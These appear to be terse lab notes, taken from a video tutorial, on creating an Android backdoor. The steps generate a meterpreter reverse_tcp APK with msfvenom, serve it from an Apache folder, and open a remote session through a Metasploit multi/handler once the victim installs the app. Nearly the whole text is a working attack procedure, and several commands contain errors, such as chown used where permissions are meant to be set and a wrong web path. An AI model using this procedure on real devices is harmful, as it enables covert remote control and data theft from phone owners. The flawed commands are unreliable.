1) Creating binary payloads to hack kali linux 
	1) creating server and testing devices located in the network which are prone to attacks
	2) Attacking the device using simple backdoor and monitor the system activity 
2) In the machine click the device menu go the terminal emulator press su to get root
3) type ip addr 10.10.10.69/24 dev eth0 to add the ip 
4) open Kali 
	1) service postgresql start 
	2) msfvenom -l to view all the payloads 
	3) to generate a reverse android payload use the command `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=kali_IP R > Desktop/Backdoor.apk`
	4) create a folder ` mkdir /var/www/html/share`
	5) change file perms of the folder to 755 using the command **chown  -R 755 /var/www/html/share** 
	6) change the ownership of the folder to www-data by **chown -R www-data:www-data /var/html/share** 
	7) **cp /root/Desktop/backdoor.apk /var/www/html/share**
	8) service apache2 start 
	9) open metasploit start listener **use exploit/multi/handler** set payload **android/meterpreter/reverse_tcp** 
	10) set lhost to kali IP add
	11) exploit -j -z 
5) go to the android emulator open browser type `http://kali_IP/share` 
6) download and install and open 
7) in kali 
	1) session -i 1 
Done 



https://www.youtube.com/watch?v=b2YrqpeklFw&list=PLrrgFyE6PtlaCixUxJPM0Y9Peye6iCewH&index=13

